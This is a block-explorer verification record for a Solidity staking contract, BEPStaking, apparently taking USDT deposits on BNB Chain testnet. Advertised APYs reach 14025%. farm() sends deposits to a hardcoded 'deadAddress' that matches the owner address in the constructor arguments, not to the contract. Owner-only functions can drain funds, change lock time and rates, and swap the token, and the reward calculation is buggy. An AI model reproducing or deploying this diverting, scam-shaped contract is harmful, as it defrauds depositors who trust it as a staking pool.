{"SourceCode": "/**\r\n *Submitted for verification at testnet.bscscan.com on 2023-11-25\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IERC20 {\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address who) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a);\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract Ownable {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract BEPStaking is Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    IERC20 public token;\r\n    uint256 public time = 1 days;\r\n    uint256 public decimals = 18; // Decimals for USDT token\r\n\r\n    mapping(uint256 => uint256) public allocation;\r\n\r\n    constructor(IERC20 _tokenAddr, address _owner) {\r\n        token = _tokenAddr;\r\n        Ownable(_owner);\r\n\r\n        allocation[7] = 113050000000000000000;   // 113.05% APY\r\n        allocation[30] = 556920000000000000000;  // 556.92% APY\r\n        allocation[60] = 1280840000000000000000; // 1280.84% APY\r\n        allocation[90] = 2305510000000000000000; // 2305.51% APY\r\n        allocation[180] = 5533220000000000000000; // 5533.22% APY\r\n        allocation[365] = 14025170000000000000000; // 14025.17% APY\r\n    }\r\n\r\n    struct UserInfo {\r\n        uint256 depositToken;\r\n        uint256 lastUpdated;\r\n        uint256 lockableDays;\r\n        uint256 withdrawReward;\r\n        uint256 withdrawableReward;\r\n        uint256 depositTime;\r\n        uint256 withdrawDepositAmount;\r\n    }\r\n\r\n    mapping(address => uint256[]) public depositedARB;\r\n    mapping(address => uint256[]) public lockableDays;\r\n    mapping(address => uint256[]) public depositTime;\r\n    mapping(address => UserInfo) public users;\r\n    address public deadAddress = 0xd09a2eB620428e0cf354D0d59170d46AA61787c9;\r\n    uint256 public referralReward = 5e18;\r\n\r\n    receive() external payable {}\r\n\r\n    event Deposit(address indexed to, address indexed from, uint256 amount, uint256 day, uint256 time);\r\n\r\n    function farm(uint256 _lockableDays, uint256 amount) public {\r\n        require(amount >= getMinimumAmount(_lockableDays), \"Enter minimum amount for the specified lockable days\");\r\n        require(allocation[_lockableDays] > 0, \"Invalid day selection\");\r\n\r\n        // token.transferFrom(msg.sender, address(this), amount);\r\n        token.transferFrom(msg.sender, deadAddress, amount);\r\n        depositedARB[msg.sender].push(amount);\r\n        depositTime[msg.sender].push(block.timestamp);\r\n        users[msg.sender].depositToken += amount;\r\n        lockableDays[msg.sender].push(_lockableDays);\r\n\r\n        emit Deposit(msg.sender, deadAddress, amount, _lockableDays, block.timestamp);\r\n    }\r\n\r\n    function getMinimumAmount(uint256 _lockableDays) internal pure returns (uint256) {\r\n        if (_lockableDays == 7) return 10 * (10 ** 18);\r\n        if (_lockableDays == 30) return 100 * (10 ** 18);\r\n        if (_lockableDays == 60) return 300 * (10 ** 18);\r\n        if (_lockableDays == 90) return 500 * (10 ** 18);\r\n        if (_lockableDays == 180) return 800 * (10 ** 18);\r\n        if (_lockableDays == 365) return 1500 * (10 ** 18);\r\n        revert(\"Invalid lockable days\");\r\n    }\r\n\r\n    function pendingRewards(address _add) public view returns (uint256) {\r\n        uint256 reward;\r\n        for (uint256 z = 0; z < depositedARB[_add].length; z++) {\r\n            uint256 lockTime = depositTime[_add][z] + (lockableDays[_add][z] * time);\r\n            if (block.timestamp > lockTime) {\r\n                reward = (allocation[lockableDays[_add][z]].mul(depositedARB[_add][z]).div(100)).div(1e18);\r\n                reward += reward;\r\n            }\r\n        }\r\n        return reward;\r\n    }\r\n\r\n    function harvest(uint256[] memory _index) public {\r\n        for (uint256 z = 0; z < _index.length; z++) {\r\n            require(users[msg.sender].depositToken > 0, \"Deposit not found\");\r\n\r\n            uint256 lockTime = depositTime[msg.sender][_index[z]] + (lockableDays[msg.sender][_index[z]] * time);\r\n            require(block.timestamp > lockTime, \"Unstake time not reached!\");\r\n\r\n            uint256 reward = (allocation[lockableDays[msg.sender][_index[z]]].mul(depositedARB[msg.sender][_index[z]]).div(100)).div(1e18);\r\n\r\n            users[msg.sender].withdrawableReward += reward;\r\n            users[msg.sender].depositToken -= depositedARB[msg.sender][_index[z]];\r\n            users[msg.sender].withdrawDepositAmount += depositedARB[msg.sender][_index[z]];\r\n\r\n            depositedARB[msg.sender][_index[z]] = 0;\r\n            lockableDays[msg.sender][_index[z]] = 0;\r\n            depositTime[msg.sender][_index[z]] = 0;\r\n        }\r\n\r\n        for (uint256 t = 0; t < _index.length; t++) {\r\n            for (uint256 i = _index[t]; i < depositedARB[msg.sender].length - 1; i++) {\r\n                depositedARB[msg.sender][i] = depositedARB[msg.sender][i + 1];\r\n                lockableDays[msg.sender][i] = lockableDays[msg.sender][i + 1];\r\n                depositTime[msg.sender][i] = depositTime[msg.sender][i + 1];\r\n            }\r\n            depositedARB[msg.sender].pop();\r\n            lockableDays[msg.sender].pop();\r\n            depositTime[msg.sender].pop();\r\n        }\r\n\r\n        uint256 totalWithdrawAmount = users[msg.sender].withdrawDepositAmount;\r\n        uint256 totalWithdrawReward = users[msg.sender].withdrawableReward;\r\n\r\n        token.transfer(msg.sender, totalWithdrawReward);\r\n        token.transfer(msg.sender, totalWithdrawAmount);\r\n\r\n        users[msg.sender].withdrawReward += users[msg.sender].withdrawableReward;\r\n        users[msg.sender].withdrawableReward = 0;\r\n        users[msg.sender].withdrawDepositAmount = 0;\r\n    }\r\n\r\n    function userInformation(address _add) public view returns (uint256[] memory, uint256[] memory, uint256[] memory) {\r\n        return (depositedARB[_add], lockableDays[_add], depositTime[_add]);\r\n    }\r\n\r\n    function emergencyWithdraw(IERC20 _tokenaddr, uint256 _token) external onlyOwner {\r\n        _tokenaddr.transfer(msg.sender, _token);\r\n    }\r\n\r\n    function emergencyWithdrawARB(uint256 amount) external onlyOwner {\r\n        payable(msg.sender).transfer(amount);\r\n    }\r\n\r\n    function changeTimeCal(uint256 _time) external onlyOwner {\r\n        time = _time;\r\n    }\r\n\r\n    function changePercentages(\r\n        uint256 _7daysPercent,\r\n        uint256 _30daysPercent,\r\n        uint256 _60daysPercent,\r\n        uint256 _90daysPercent,\r\n        uint256 _180daysPercent,\r\n        uint256 _365daysPercent\r\n    ) external onlyOwner {\r\n        allocation[7] = _7daysPercent;\r\n        allocation[30] = _30daysPercent;\r\n        allocation[60] = _60daysPercent;\r\n        allocation[90] = _90daysPercent;\r\n        allocation[180] = _180daysPercent;\r\n        allocation[365] = _365daysPercent;\r\n  }\r\n\r\n    function setToken(address _tokenAddr) external onlyOwner {\r\n        token = IERC20(_tokenAddr);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"_tokenAddr\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"day\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"allocation\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_7daysPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_30daysPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_60daysPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_90daysPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_180daysPercent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_365daysPercent\",\"type\":\"uint256\"}],\"name\":\"changePercentages\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"changeTimeCal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"depositTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"depositedARB\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"_tokenaddr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_token\",\"type\":\"uint256\"}],\"name\":\"emergencyWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"emergencyWithdrawARB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_lockableDays\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"farm\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"_index\",\"type\":\"uint256[]\"}],\"name\":\"harvest\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"lockableDays\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_add\",\"type\":\"address\"}],\"name\":\"pendingRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"referralReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tokenAddr\",\"type\":\"address\"}],\"name\":\"setToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"time\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token\",\"outputs\":[{\"internalType\":\"contract IERC20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_add\",\"type\":\"address\"}],\"name\":\"userInformation\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"\",\"type\":\"uint256[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"depositToken\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastUpdated\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lockableDays\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawableReward\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"depositTime\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawDepositAmount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "BEPStaking", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000055d398326f99059ff775485246999027b3197955000000000000000000000000d09a2eb620428e0cf354d0d59170d46aa61787c9", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://eaba091f725c2a22e709d243d4e377e95338f8e62e940933657890ff35f44d80"}